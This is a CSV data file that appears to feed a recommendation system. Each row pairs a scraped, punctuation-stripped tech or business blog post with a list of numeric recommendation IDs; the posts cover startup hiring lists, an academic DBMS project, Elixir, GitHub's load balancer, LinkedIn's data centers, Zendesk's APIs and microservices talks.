X1,file_name,category,text,recommendations
4,training-dataset/business/238.txt,business,Advice to Grads  Join A Winning Startup  v  2016 For many years  I have been keeping an updated list of interesting  scaling start ups that are well regarded and hiring  private or recently public  to share with the students in my HBS class to point them in the direction of high quality  fast growing companies worth exploring  Andy Rachleff at Stanford   Wealthfront does the same in the fall  here s their Oct 2015 list   although it is lighter on East Coast companies  Last year  I open sourced the list and with graduation season coming  I thought I would share an updated version  again organized by geography  Note that this is my own imperfect point of view with imperfect data  also informed with a sprinkling of Mattermark data and CB Insights  here is the latter s full list of the  as of this writing  154 unicorns  which is another interesting filter    Full disclosure  Flybridge portfolio companies are hyperlinked  Feedback welcome  I m sure I made many mistakes and omissions   Boston   Private  Acacia  Acquia  Acronis  Actifio  AdAgility  Affirmed Networks  Anaqua  Applause  Attivio  BevSpot  Bit9  BitSight  CarGurus  ClearSky Data  Cloudlock  Data Robot  DataXu  Digital Lumens  Draft Kings  Drift  Drizly  Dyn  Ellevation  Evertrue  FlyWire  Fuze  HourlyNerd  Infinidat  Iora Health  Jana  Jibo  Kenshoo  Kyruus  Localytics  Lola  LovePop  M Gemi  Nasuni  OwnerIQ  OnShape  OpenBay  Panorama Education  PillPack  Pixability  Placester  Promoboxx  Rethink Robotics  Savingstar  Simplisafe  Simplivity  Sonos  Tamr  Toast Valore Books  Veracode  Virgin Health  VMTurbo  Zerto  Public  Akamai  CyberArk  Demandware  Hubspot  iRobot  Kayak Priceline  LogMeIn  Rapid7  Trip Advisor  Wayfair  NYC   Private  1st Dibs  Adore me  Alfred  Amino  Andela  Appnexus  BetterCloud  Betterment  Birchbox  Bloomberg  Boxed  Blue Apron  BuzzFeed  Casper  CB Insights  ClassPass  Codecademy  Compass  Contently  DataDog  DataMinr  Digital Ocean  Fan Duel  Floord  Fundera  General Assembly  Handy  Harry s  IEX  Integral Ad Science  Jet com  KeyMe  Kickstarter  Knewton  Mark43  MediaMath  Message ai  Moat  MongoDB  Namely  Newscred  Oscar Health  Outbrain  Payoneer  PlaceIQ  Policy Genius  RadioDash  Rent the Runway  Sailthru  SeatGeek  Shapeways  Spotify  Sprinklr  Stack Exchange  tracx  Vaultive  Warby Parker  WeWork  Yext  YouNow  ZocDoc  Public  Etsy  Match com  OnDeck  Shutterstock  SF SValley   Private  23AndMe  Airbnb  Anaplan  Angellist  App Annie  App Dynamics  Automattic  Beepi  BloomReach  Checkr  Cloudbees  Cloudera  Cloudflare  Coinbase  Collective Health  Coupa  Coursera  CreditKarma  DataStax  Docker  Docusign  DoorDash  DoubleDutch  Drawbridge  Dropbox  Earnest  Eventbrite  Evolent Health  FundBox  Funding Circle  Gigster  Gigya  GitHub  GlassDoor  Gusto  HackerRank  Houzz  Instacart  Jasper  Jawbone  JustFab  Lattice Engines  Lumosity  Lyft  MasterClass  Mattermark  MixPanel  Monetate  NerdWallet  Nextdoor  Nutanix  Okta  OfferUp  Optimizely  Palantir  Pinterest  Plaid  Plastiq  PlexChat  Postmates  Quizlet  Quora  Shazam  Signifyd  Slack  Slice  SoFi  SpaceX  StitchFix  Stripe  Sumo Logic  Survey Monkey  Theorem LP  Thumbtack  Twilio  Uber  UpWork  Wallapop  Wanelo  WealthFront  Wish  Zumper  ZScaler  Zuora  Public  Atlassian  Box  Castlight Health  FireEye  Fitbit  Horton Works  Lending Club  LinkedIn  New Relic  Palo Alto Networks  ServiceNow  Splunk  Square  Tableau  Tesla  Twitter  Workday  Yelp  Zendesk  Israel  often with HQ or business operations in the US   either BOS  NY or SF    Private  Argus  Fiverr  Forter  Freightos  Fundbox  Hola  IronSource  Kaltura  Kaminario  Moovit  ObserveIT  Outbrain  Playbuzz  Riskified  Sisense  SundaySky  Taboola  tracx  Valens  Wochit  Wibbitz  Public  CyberArk  Mobileye  Wix  London  Bla bla car  CityMapper  Duedil  FarFetch  Funding Circle  GoCardless  King  Purple Bricks  Shazam  TransferWise  Vouched For  LA  AirPush  Auction com  Cornerstone on Demand  Dollar Shave Club  Honest Company  JustFab  Network of One  OpenX  Ring  Riot Games  Rubicon Project  SnapChat  SpaceX  Telesign  Tinder Match com  TrueCar  Zefr  ZestFinance  ZipRecruiter  SEA  Apptio  Avalara  Julep  Juno  Koru  Peach  Porch  Pro  Refin  CO  LogRhythm  Rally  Sympoz  Webroot  Welltok  UT  AtTask  Domo  Health Catalyst  Hirevue  Inside Sales  Instructure  Plurasight  Qualtrics  CHI  AvantCredit  BucketFeet  Fooda  Groupon  Iris Mobile  Narrative Sciences  Raise  SpotHero  SproutSocial  Uptake  DC  2U  Cvent  Opower  Optoro  Sonatype  Vox Media  WeddingWire  ATL  Kabbage  MailChimp  Yik Yak,"[4 890 1086 572 281 707 344 671 332 134 673]"
15,training-dataset/engineering/868.txt,engineering,Building a New Database Management System in Academia    Blog    Andy PavloTL DR  Yes  it is possible to build a new DBMS in academia  It s still hard  We found that using Postgres as a starting point was too slow for in memory OLTP  The challenges in academia are slightly different than with a start up   I ve been on my grind the last couple of months  We had a successful demo of our system at CIDR in January  Somebody started a feud with me  I m looking past that and trying to maintain my flow   Like other schools with large CS programs  CMU has a long tradition of big software system projects that go on to have a life outside of the university  e g   Mach  AFS   To the best of my knowledge  there has not been a full featured DBMS that has come out of CMU 1   The closest would be Natassia s Alimaki s Shore MT project from when she was at CMU  but it is only an execution engine and storage manager  think InnoDB    Although I am not ready to officially  announce  our DBMS yet  I want to talk about what my group has been working on for the last two years  This is also how I plan to spend the next five years 2  of my life building this system  The problem with building an open source DBMS is that the bar is high because there are already great existing systems  e g   MySQL  Postgres   I want to avoid harsh initial reactions from making grandiose claims about its ability  The system s self driving components are going to take a while  i e   years  to get the research right   Strategies for Starting a New DBMS Project  Few take on the task of writing a DBMS from scratch  Part of the reason is that there is just so much infrastructure that you need to have in order to create a system that is usable  Such components include a SQL parser  query optimizer  system catalogs  configuration files  networking support  and expression   type systems  This is even before you get to the other hard parts like concurrency control  query execution  and storage recovery  I refer to all of the items in the first list as the  front end  of a system  This is not sexy code to write  This is why most new DBMSs start with building on Postgres 3  by either forking it  e g   Greenplum  Vertica  PipelineDB  or using its extension hook APIs  e g   CitusDB  Vitesse  TimescaleDB   One could also try to create a new storage engine for MySQL  but these projects are notoriously never successful 4   see Falcon  DeepSQL  Akiban  InfiniDB   Another advantage of basing your new system off of an existing one is that you get to retain compatibility with some of the existing tools in a DBMS s ecosystem   When we started the Peloton project we decided to fork Postgres and then cut out the parts that we wanted to rewrite  Postgres  code is beautiful  It s well documented  It s portable  It s a textbook implementation of a relational DBMS  But it is a bit dated and the overall architecture has some issues  The first problem that we encountered was that we had to convert it from ANSI 95 C to modern C  11 to make it work with our new storage manager  My PhD student Joy Arulraj did this with some summer interns in about a month  see his C   Postgres fork on Github   We then spent another month converting its runtime architecture from a multi process  shared memory model to a single process  multi threaded model  We deemed that this was necessary to support better single node scale up now and eventually go distributed in the future  One surprising thing that we found was that using Postgres  WIN32 code is easier to convert to pthreads than the Linux specific portions of the code   At this point we had a functioning DBMS that could convert Postgres query plans into our system s plans and then execute them on our back end engine  Our testing  however  showed that this conversion from the Postgres world to our system was a bottleneck when we tried to increase the number of concurrent transactions  For an OLAP system  using the Postgres front end code is fine  This is because the system will spend most of its time processing long running queries and not in the front end  But if you want to build a DBMS that supports highly concurrent workloads with an in memory database  then all of this legacy code is too slow   We therefore tried to take out the slow parts from the front end and keep as much as possible  But the problem with this approach is it is not easy to pull out Postgres  individual components  For example  you can t just take out the query optimizer without bringing along the catalogs  If you take the catalog  then you have to include the storage manager  which then includes the lock manager  memory manager  and so on  This is well known problem in database systems and was the motivation of the  RISC style  architectures  The SIGMOD Programming Contest originally started as a way to build up a repository of DBMS components that one could glue together to make a real system  There are also other attempts at making standalone components  For example  there are several query optimizer frameworks  Orca  and generators  Columbia  Opt      After a few weeks of debating our options  we concluded that it would probably be the same amount of work to integrate these components into our system as it would be to just write our own  especially since some of these components are over 20 years old   Using them would also mean that there would be large parts of the system that we didn t have a complete understanding of and therefore it would be difficult to control when we start integrating the self driving parts   In 2016  we decided to bite the bullet and remove the rest of Postgres from our system  This means that we are re writing all of the front end components ourselves   Research Philosophy  You may be asking what does everything I ve written so far have to do with research  One could argue that our journey just sounds like the growing pains of a start up company building a DBMS  Furthermore  if I am claiming that the unique characteristic of our new DBMS is that it is autonomous  why do I care whether it is not as fast as it could be if I kept the Postgres front end  Why bother with building  yet  another DBMS   Mike Stonebraker taught me that the best way to have the most impact in database research is to build a system that solves real world problems for people  One could just write papers and then hope that somebody else picks up your ideas and implements them  I think that this is a rare occurrence relative to the number of academic papers that are published  It does happen though  see Dan Abadi and Daniel Lemire   Now for Mike  the best way to do this is to build an academic prototype  publish a paper  and then form a company that builds the real system  That s a bit risky for someone without tenure  but it can be done  Dan Abadi strikes again    The way that my research group is designing and building our DBMS is through a step by step process  For every part of the system that we have to build  we will try to write a research paper about our approach  My inspiration for this comes from the HyPer DBMS project from the TUM DB Group  They have a lot of papers that describe the different parts of their system and all the problems that they had to solve  But I want to go a little deeper than just writing about only what we did  We will examine all of the state of the art implementations in both academia and industry  This is through a combination of reading papers as well as reaching out to friends in industry and asking them how they implement certain things  We then perform experiments that evaluate the different approaches in Peloton and under a variety of workload scenarios  Then whatever one is the best is what we will use in our system   One benefit of this style of research is that it makes us extremely unbiased  That is  unlike other papers that compare their new algorithm or method to other state of the art implementations  we don t have any preference  We will take whatever just works  I will also add that we are doing more than just running existing implementations in a single platform  we also spend time to understand the algorithms carefully and come up with new techniques for overcoming bottlenecks  It does  however  mean that that it takes longer for us to run the experiments because we have to keep tweaking the system   As an example of this  there are several papers and articles published in recent years on high performance multi version concurrency control  MVCC   These include the protocols used in Microsoft Hekaton  HyPer  and MemSQL  The problem  however  is that these articles don t always explain the reasoning behind why the developers made certain design decisions in their DBMS  Furthermore  there are also other aspects of the system that are highly dependent on each other that are not evaluated thoroughly  I had a visiting PhD student  Yingjun Wu  implement all of them with some MS students and then we did a bake off  I will discuss our recently published MVCC study in my next blog post   And the reason why we are spending this effort to make this system as fast as possible is to ensure that it is robust and nimble  This will allow the self driving  brain  to quickly try out different configurations and optimizations  and then  hopefully  immediately get feedback as to whether its decisions were correct   Building a DBMS is Hard  Building One in Academia is Even Harder  I recognize that the above agenda sounds too idealistic and thus some of you may think that such an approach to DBMS development is only possible in academia  I concede that academia provides the freedom for one to be more methodical about designing the system than what may be possible at a start up or a large company  But it does not necessarily mean that our system is going to be better or that our job is somehow easier  Although I don t have  direct  financial pressures  building a new DBMS is still a daunting challenge  There are other problems that I have to deal with that a company does not  I don t get to spend all my time working on the system because I have to teach  write grant proposals  serve on program committees  write papers  and teach my students to survive on the streets   Developer Continuity  Every tech company struggles with attracting good talent  except for possibly Facebook   I don t really have that problem since the admissions process sort of takes care of that for me  My students at CMU are awesome but they are only with me for a short amount of time  For undergrads and MS students  it s usually about two semesters  New students often lack knowledge about DBMS internals  that s okay  they re here to learn   it usually takes them about a semester to pick this up either from working on the system or by taking my advanced DB class  PhD students obviously stick around for longer but they are in graduate school to do research  I have to balance their time spent writing papers versus writing new features in the system  One thing that I require is that  almost  all of the code that they write for experiments has to be merged into the DBMS s master branch after they submit the paper for review   I will admit that I haven t quite figured out how to manage this perpetual revolving door for my team  Obviously writing a lot of tests and documentation is important  but this doesn t always happen  One way to solve this problem is to hire a full time systems programmer  but it s hard to raise money to do this as a new professor  You can t use a regular NSF research grant to pay for a programmer  Instead there are infrastructure grants   Lack of Workloads   Testing Tools  Every DBMS company creates their own framework and infrastructure for testing their DBMS  The workloads in these test suites are collected from users over time  But when you first start building a DBMS in academia  you do not have users  Thus  the only way to get real workloads is by signing NDAs  This is the standard practice in industry  often as part of a POC   I try to avoid NDAs for both myself and my students  They are always a huge time sink because things get messy when university lawyers start talking with company lawyers  They also make it tricky for us to discuss and share our research findings with others   If you don t have customer workloads  then the next best option are synthetic workloads  The good news here is that there are several database benchmarks available  Most of them are specific to one system  pgbench  sysbench  and contain only one workloads  usually some variant of TPC C   Our OLTP Bench framework does include multiple workloads but it is meant for benchmarking performance  We have not found a tool that can provide comprehensive SQL testing  SQLsmith is close to what we want but you have to provide your own schema  There are a lot of interesting ideas in SIGMOD s now defunct DBTest workshop  but there is little to no code available   We are working on a new SQL test suite that we will release later in the year  It will use JDBC and Postgres  SQL AST so it should be compatible with several other systems   Hardware  Getting hardware for testing and benchmarking is not a problem like it used to be in previous decades  Computers are cheap  Every student also has their own laptop  This means that we only have to provide the students with monitors and keyboards at each desk in our lab  We then have some additional server machines for benchmarking  The one lesson that I have learned since starting the project is that a large percentage of students use a Mac laptop  This means that it is important that your DBMS can build on OSX even if you only intend to deploy it on Linux  We currently don t support OSX and instead provide a Vagrant file  Students tell me that they prefer developing directly in OSX  I should have made sure that we support OSX from the beginning of the project   If you want to get exotic hardware  e g   Infiniband  NVM   then you either have to write a simulator  bleh  or you have to know somebody at the company to ask for a donation  DBMS developers at the major companies get access to all kinds of new hardware earlier than the average person so that they they have time to make sure that their system is compatible  again  NDAs help with this    Other Academic Database System Projects  I now want to briefly mention some of the other large scale  multi year DBMS projects that are going on right now in academia  The most famous academic DBMSs are Stonebraker s Ingres and Postgres projects  Mike always likes to say that you can build the first 90  of a DBMS in academia in just a few years  but then to build the remaining 10  of the system you need  5 million and several years  The next most famous is MonetDB by Peter Boncz and Martin Kersten  Peter then later built the X100 prototype based on his experiences with MonetDB that formed the basis of VectorWise 5   Lastly  there is the previously stated TUM HyPer DBMS  I consider HyPer to be one the state of the art DBMS implementations right now   There are a couple other academia only DBMS projects that I am aware of right now  These are systems that are designed to support real world applications and usecases  so I am excluding projects like Silo that are only academic prototypes  I am also excluding systems like Shark  BlinkDB  and H Store where there are now companies actively involved in the commercial versions   Note also that none of these projects listed below are based on Postgres  The last major academic system that I know that used Postgres was Berkeley s TelegraphCQ  which later became Truviso    Footnotes,"[15 1373 778 673 520 1295 683 1336 1225 92 61]"
18,training-dataset/engineering/1304.txt,engineering,Stuff The Internet Says On Scalability For August 26th  2016,"[18 1373 946 1402 664 87 712 112 1106 778 695]"
26,training-dataset/engineering/981.txt,engineering,Why I m betting on Elixir   Ken Mazaika   MediumBackground  I ve spent the past 6 years building web applications in Ruby and the Rails framework  I ve flirted with new programming languages as they came out  but Elixir is the first language that has been able to captivate me   Ruby Crushed It   The ruby language and the Rails framework completely changed the way web applications were built  it started a religion of values that the community cared about  It pioneered the idea that the tools programmers use should be optimized for developer happiness and productivity   It made the bold challenge that it is developers  jobs to make sure their code was adequately tested and worked  Other languages and frameworks scoffed at the approach  until it started winning  Then they started incorporating principles from the ruby community in their language and framework   Ruby went from humble beginnings as an obscure language to one of the most popular languages  largely because of the Rails framework and tremendous leadership from people like DHH  Wycats  Aaron Patterson  Jose Valim and a ton of other superstars   But every so often  artifacts of ruby s humble beginnings arise  Run away memory   In Zed Shaw s infamous  Rails is a Ghetto  post  he rants about how problems with garbage collection required early Rails applications restart their processes around every 4 minutes in order to remain live   One of the most popular rails servers out there today is unicorn  My production web application is a Rails application that is fairly simple  in comparison to other applications I ve worked on  I moved the application to a 512MB DigitalOcean droplet following standard instructions  After being deployed for several days  my unicorns had eaten all available memory and the application was quite slow   The solution  The unicorn worker killer  It s not unlike the solution from the early days   My DigitalOcean droplet can handle two unicorn worker threads  which take most of the resources  and Postgres database and few other applications  Request times are okay though  so it gets the job done   Concurrency   I ve spent years of developing Rails applications  I have never spawned a new thread in a production Rails web application  Rails itself is thread safe  but I have the awareness that there be dragons when dealing with different threads  having used them heavily in Java  C   and other object oriented languages   The fact is  that I don t want to think about mutexes  semaphores  or anything like that  Pausing one thread  while executing another one doesn t seem like it s really concurrent anyway  Plus  are you sure your code doesn t cause deadlocks   Since the testing is a core tenant of the ruby community  it s not a surprise that most ruby developers stay away from using threads as they re basically un testable  and tend to produce bugs that are difficult to reproduce   I  like most sane Rails developers  use sidekiq or resque to process things in parallel  Rails 2 2 added thread safety  but Rails 4 2 added the Active Job API  which in my opinion is a heck of a lot more useful   But background jobs are just that  done in the background  Mission critical stuff should remain in the main process  so you can react to failure or make sure transactions go through successfully before completing the task   Speed   I m selfish  I value my time  I value it a lot  And that s why test speed is something I care about  I spent serious time optimizing my test suite performance  without making changes to the architecture of the application and causing test induced design damage   For a time the project I was working on had unit and functional tests that took just over 20 minutes  At the time I tested using hydra for distributed Rails tests  but I had a hard time getting the test suite to pass  likely due to an obnoxiously complex codebase  with some of the not so the best code in it      Even test startup time started to take a long time  around 40 seconds  Ever wait 40 seconds to see   syntax error  unexpected end of input  expecting keyword_end   or a similar foolish syntax goof up  I have   The solution  Zeus  A wonderful gem that pre loads typical start up stuff for a Rails app and can  according to GitHub    Boot any rails app in under a second   I seriously love this gem and suggest you use it if you re a Rails developer   But  how were the developers able to achieve this  They wrote the core of it in friggin  Go   Scala  A couple years ago  I got super stoked about Scala  Then I started using it  and promptly started hating it   It s has a lot of functional programming concepts  The akka framework  allows highly concurrent fault tolerant applications  It runs on the JVM so any Java library is fair game to use  and the JVM is incredibly well tuned for performance   The language itself I found enjoyable  I liked pattern matching  The deal breaker for me  The JVM  Package management for jars IMO is seriously overcomplicated  when comparing it with Rubygems and Bundler   There are a bunch of solutions  SBT  Maven  Ivy  but they all make me cringe when I need to import someone else s library  Maybe I ve been spoiled by Ruby  but Ruby s package management is core to my productivity   The other thing that bothered me about Scala was the libraries I was using were largely written in Java by people with an entirely different set of values than I have   Building Scala web applications with the Play  framework felt like building a Java web application with the Play  framework  except with slightly better syntax and the ability to do pattern matching  While Play  is influenced by Rails quite a bit  the difference is visceral   The Elixir Ecosystem  Package Management with Mix  When first venturing into playing with Elixir  I encountered Mix  Mix is like a hybrid of Bundler and rake in ruby  What blows me away about Mix is this  it doesn t feel worse than Bundler and Rake  It doesn t seem a lot better either  but the bar is incredibly high and meeting it is impressive   Mix just does its job nicely  stays out of the way  and doesn t force you to wrangle XML   The Erlang Virtual Machine  Elixir runs on the Erlang virtual machine and embraces most of the values of the Erlang community  Both Elixir and Erlang pride themselves for an emphasis on functional programming that are fault tolerant and highly scalable   In most talks about Elixir you can watch on YouTube the following stories about Erlang   Erlang is powering around 50  of telecom networks  When was the last time your phone had  Scheduled Maintaince    WhatsApp  which was acquired for billions of dollars  was running millions of processes on a single server  supported 450 million users  and had only 32 engineers   These values are the same type of values that the Elixir community embraces  Because of this as an Elixir developer  when you use Erlang supervisors or the cowboy http server  you don t feel like you re sacrificing your values   The Phoenix Web Framework  The phoenix framework is clearly heavily influenced by Ruby on Rails and coding a Phoenix Web Application feels a lot like coding a Rails app  I love the Rails router  I love ActionController  ActiveRecord  Rails Views and the way you code web application  I like the organization of Rails applications   Phoenix is such a Railsy solution you ll feel like you re building a Rails app  with the exception being that it runs with Elixir and has all the benefits of Elixir and the Erlang virtual machine   Phoenix also supports WebSockets through channels  It basically gives you the ease of use of WebSockets that Firebase provides with fine grained control   Did I mention it s fast  It s fast as lightning  Check out these logs from my  5 month DigitalOcean droplet  That s right microsecond request speeds from a single core machine   Strong Leadership  In my opinion  the difference between open source and movement  is all around the leadership involved in the project  In short  I believe really smart people need to be putting the work in to improve the software every single day   The Rails movement gained so much momentum because of all the work put in by DHH  Aaron Patterson  Jose Valim  Wycats  and a ton more brilliant people  Rails wasn t launched at v1 and people stopped doing the work   It s old school put in the work mentality  and building a community takes work   Jose Valim  Chris McCord  and all the members of the Elixir Lang core team and Phoenix core team have  and continue to put in the work that needs to be done for the Elixir community to thrive   Friends  the web is about to under go a transformational change  Let s face it  CRUD apps are a commodity these days  The next  AirBnB for Renting Ketchup probably isn t going to survive   The people who will win are going to be the ones who embrace changes in technology  The fact that WebSockets  processes  and concurrency in Phoenix and Elixir are cheap  without sacrificing developer happiness is an absolute game changer   I totally love Ruby on Rails  It completely changed the way that people thought about building web applications from 2005 2014   I expect Elixir and Phoenix to have a similar impact from 2015 2025   If you want to start building web applications with Phoenix and Elixir  check out this tutorial  I built   If you found value in this article  it would mean a lot to me if you hit the recommend button,"[26 1335 257 90 214 607 316 234 1309 778 641]"
36,training-dataset/engineering/566.txt,engineering,Introducing the GitHub Load BalancerAt GitHub we serve billions of HTTP  Git and SSH connections each day  To get the best performance we run on bare metal hardware  Historically one of the more complex components has been our load balancing tier  Traditionally we scaled this vertically  running a small set of very large machines running haproxy  and using a very specific hardware configuration allowing dedicated 10G link failover  Eventually we needed a solution that was scalable and we set out to create a load balancer solution that would run on commodity hardware in our typical data center configuration   Over the last year we ve developed our new load balancer  called GLB  GitHub Load Balancer   Today  and over the next few weeks  we will be sharing the design and releasing its components as open source software   Out with the old  in with the new  GitHub is growing and our monolithic  vertically scaled load balancer tier had met its match and a new approach was required  Our original design was based around a small number of large machines each with dedicated links to our network spine  This design tied networking gear  the load balancing hosts and load balancer configuration together in such a way that scaling horizontally was deemed too difficult  We set out to find a better way   We first identified the goals of the new system  design pitfalls of the existing system and prior art that we could draw experience and inspiration from  After some time we determined that the following would produce a successful load balancing tier that we could maintain into the future   Runs on commodity hardware  Scales horizontally  Supports high availability  avoids breaking TCP connections during normal operation and failover  Supports connection draining  Per service load balancing  with support for multiple services per load balancer host  Can be iterated on and deployed like normal software  Testable at each layer  not just integration tests  Built for multiple POPs and data centers  Resilient to typical DDoS attacks  and tools to help mitigate new attacks  Design  To achieve these goals we needed to rethink the relationship between IP addresses and hosts  the constituent layers of our load balancing tier and how connections are routed  controlled and terminated   Stretching an IP  In a typical setup  you assign a single public facing IP address to a single physical machine  DNS can then be used to split traffic over multiple IPs  letting you shard traffic across multiple servers  Unfortunately  DNS entries are cached fairly aggressively  often ignoring the TTL   and some of our users may specifically whitelist or hardcode IP addresses  Additionally  we offer a certain set of IPs for our Pages service which customers can use directly for their apex domain  Rather than relying on adding additional IPs to increase capacity  and having an IP address fail when the single server failed  we wanted a solution that would allow a single IP address to be served by multiple physical machines   Routers have a feature called Equal Cost Multi Path  ECMP  routing  which is designed to split traffic destined for a single IP across multiple links of equal cost  ECMP works by hashing certain components of an incoming packet such as the source and destination IP addresses and ports  By using a consistent hash for this  subsequent packets that are part of the same TCP flow will hash to the same path  avoiding out of order packets and maintaining session affinity   This works great for routing packets across multiple paths to the same physical destination server  Where it gets interesting is when you use ECMP to split traffic destined for a single IP across multiple physical servers  each of which terminate TCP connections but share no state  like in a load balancer  When one of these servers fails or is taken out of rotation and is removed from the ECMP server set a rehash event occurs  1 N connections will get reassigned to the remaining servers  Since these servers don t share connection state these connections get terminated  Unfortunately  these connections may not be the same 1 N connections that were mapped to the failing server  Additionally  there is no way to gracefully remove a server for maintenance without also disrupting 1 N active connections   L4 L7 split design  A pattern that has been used by other projects is to split the load balancers into a L4 and L7 tier  At the L4 tier  the routers use ECMP to shard traffic using consistent hashing to a set of L4 load balancers   typically using software like ipvs LVS  LVS keeps connection state  and optionally syncs connection state with multicast to other L4 nodes  and forwards traffic to the L7 tier which runs software such as haproxy  We call the L4 tier  director  hosts since they direct traffic flow  and the L7 tier  proxy  hosts  since they proxy connections to backend servers   This L4 L7 split has an interesting benefit  the proxy tier nodes can now be removed from rotation by gracefully draining existing connections  since the connection state on the director nodes will keep existing connections mapped to their existing proxy server  even after they are removed from rotation for new connections  Additionally  the proxy tier tends to be the one that requires more upkeep due to frequent configuration changes  upgrades and scaling so this works to our advantage   If the multicast connection syncing is used  then the L4 load balancer nodes handle failure slightly more gracefully  since once a connection has been synced to the other L4 nodes  the connection will no longer be disrupted  Without connection syncing  providing the director nodes hash connections the same way and have the same backend set  connections may successfully continue over a director node failure  In practise  most installations of this tiered design just accept connection disruption under node failure or node maintenance   Unfortunately  using LVS for the director tier has some significant drawbacks  Firstly  multicast was not something we wanted to support  so we would be relying on the nodes having the same view of the world  and having consistent hashing to the backend nodes  Without connection syncing  certain events  including planned maintenance of nodes  could cause connection disruption  Connection disruption is something we wanted to avoid due to how git cannot retry or resume if the connection is severed mid flight  Finally  the fact that the director tier requires connection state at all adds an extra complexity to DDoS mitigation such as synsanity   to avoid resource exhaustion  syncookies would now need to be generated on the director nodes  despite the fact that the connections themselves are terminated on the proxy nodes   Designing a better director  We decided early on in the design of our load balancer that we wanted to improve on the common pattern for the director tier  We set out to design a new director tier that was stateless and allowed both director and proxy nodes to be gracefully removed from rotation without disruption to users wherever possible  Users live in countries with less than ideal internet connectivity  and it was important to us that long running clones of reasonably sized repositories would not fail during planned maintenance within a reasonable time limit   The design we settled on  and now use in production  is a variant of Rendezvous hashing that supports constant time lookups  We start by storing each proxy host and assign a state  These states handle the connection draining aspect of our design goals and will be discussed further in a future post  We then generate a single  fixed size forwarding table and fill each row with a set of proxy servers using the ordering component of Rendezvous hashing  This table  along with the proxy states  are sent to all director servers and kept in sync as proxies come and go  When a TCP packet arrives on the director  we hash the source IP to generate consistent index into the forwarding table  We then encapsulate the packet inside another IP packet  actually Foo over UDP  destined to the internal IP of the proxy server  and send it over the network  The proxy server receives the encapsulated packet  decapsulates it  and processes the original packet locally  Any outgoing packets use Direct Server Return  meaning packets destined to the client egress directly to the client  completely bypassing the director tier   Stay tuned  Now that you have a taste of the system that processed and routed the request to this blog post we hope you stay tuned for future posts describing our director design in depth  improving haproxy hot configuration reloads and how we managed to migrate to the new system without anyone noticing,"[36 946 92 1336 1403 1351 1128 1297 520 310 1217]"
42,training-dataset/engineering/26.txt,engineering,LinkedIn s Approach to a Self Defined Programmable Data CenterCo authors  Shawn Zandi and Russ White  This post originally appeared in Network Computing   Operating a large scale  rapidly growing network requires a philosophical change in how you plan  deploy  and operate your infrastructure  At LinkedIn  as we scaled our data center network  it became evident that we needed to provision and build networks not only as quickly as possible  but also with the most simple and minimalistic approaches possible something that that previously was not quite apparent to us  Adding a new component  a new feature  or a new service without any traffic loss or architectural change is challenging   The three core principles that have guided our infrastructure design and our strategy are   Openness  Use community based tools where possible   Independence  Refuse to develop a dependence on a single vendor or vendor driven architecture  and hence avoid the inevitable forklift upgrades    Simplicity  Focus on finding the most minimalistic  simple  and modular approaches to infrastructure engineering  Apply RFC1925 Rule 12 to our network and protocols literally  perfection has been reached not when there is nothing left to add  but when there is nothing left to take away    To the three dimensions above  we recently added a new one  Programmability  Being able to modify the behavior of the data center fabric in near real time  without touching device configurations  allows us to tune the operation of the fabric to best fit application and business requirements  This allows our network operations and site reliability teams to focus on running the network  rather than on managing tools and configurations  and thereby unlocks further innovation  Programmability brings benefits like being able to prioritize traffic distribution  load balancing  or security posture when needed  on demand with minimal effort  and also increases agility and responsiveness in delivery   To accomplish these goals  we are disaggregating our network  separating the hardware and software in a way that allows us to modify and manage the network without intrusive downtime  and moving to a software driven network architecture   Single SKU data center  In our recent blog post about Project Altair  we explained our move to a single SKU data center model  specifically based on the Falco open switch platform  We use one hardware design  a 3 2 Tbps pizza box switch  as the building block for all different tiers of our leaf and spine topology that operate on top of one unified software stack  LinkedIn data center parallel fabrics can be depicted in different colors  with each leaf switch providing a path to a particular fabric as seen below,"[42 1336 1403 673 1373 1351 92 1046 1217 830 890]"
54,training-dataset/product/1079.txt,product,Building an API that Developers Love529 Flares 529 Flares    Maxime Prades  Director of Product at Zendesk  takes you through the experience of building a platform at Zendesk and being part of an API first company  He opens his talk by describing the clear value that Zendesk s APIs are providing to their customer accounts and the business  For example  customer accounts using the rest API during their 30 day trial period were converting twice as much  Similarly  the average number of  seats  held by accounts that don t use APIs is 6  If accounts are using the rest API this increases to 32 average seats  Maxime describes the basics of what an API is  why it is so powerful and what he learnt along the way   How you would describe an API to a child   Maxime says he asks this question to everyone from business development to API experts  His favourite description was that an API is essentially a language that everyone understands  I speak French  someone else might speak German  The API builds the frame of reference and lets us understand each other  It s at the core of every single product decision you ll make  Similarly  you could also describe it as a bridge that connects two different islands   Why have an API   Bridges and translators make things faster  At Zendesk  the first API was provided free by Ruby on Rails and the developers included it as a little bonus without much thought  It was put on the public website and for 6 years this was the API  They then got to the point at which it didn t scale and wasn t working   Instead of scrapping or maintaining it as it is  they rebuilt all of their structure onto a restAPI  becoming an API first company  They use exactly the same API as their customers and it has become one of their main products  Being an API first company made Zendesk faster in multiple ways   Microservices  with things like caching webpages  respond to each other faster  Zendesk can be wherever their customers are and answer future needs dynamically or customers can self service their own needs via the API  By using their own API internally Zendesk can identify and fix bugs before their customers spot it  Developing the API first for any feature forces them to avoid clutter by letting them configure and manage complexity  Maxime gives plenty of valuable advice for product managers building APIs such as,"[54 300 1351 234 520 1095 214 257 1148 61 357]"
60,training-dataset/engineering/1353.txt,engineering,Ten Talks On Microservices You Cannot Miss At Any Cost Ten Talks On Microservices You Cannot Miss At Any Cost   The Internet is flooded with articles  talks and panel discussions on Microservices  According to Google Trends  the word  microservices   has a steep  upward curve since mid 2014  Finding the best talks among all the published talks on microservices is a hard job   and I might be off the track in picking the best 10   apologize me if your most awesome microservices talk is missing here and please feel free to add a link to it as a comment  To add one more to the pile of microservices talks we already have  I will be doing a talk on Microservices Security at the Cloud Identity Summit  New Orleans next Monday   Microservices by Martin Fowler  Martin Fowler  the well respected pattern guru  is a great thought leader in the microservices world  This talk is about nine characteristics of microservices  based on this article published on Martin Fowler s blog early 2014  This is in fact one of the very first articles I read about microservices   and I am sure most of the architects and developers have gone through it many a time  These nine characteristics are  Componentization via Services  Organized around Business Capabilities  Products not Projects  Smart endpoints and dumb pipes  Decentralized Governance  Decentralized Data Management  Infrastructure Automation  Design for failure and Evolutionary Design   Also I would like to recommend you watching the talk by Martin Fowler with Erik D rnenburg on Architecture without architects   https   www youtube com watch v wgdBVIX9ifA  Principals of Microservices by Sam Newman  Sam Newman is the author of the book Building Microservices   which is a great resource for anyone interested in microservices  Recently I read and reviewed his book and it s quite natural for me to pick this talk by him to the list  This talk is about 8 key principals related to microservices  The last chapter of the book covers 7 of them and in this talk he adds one more  Consumer first   These 8 principals are  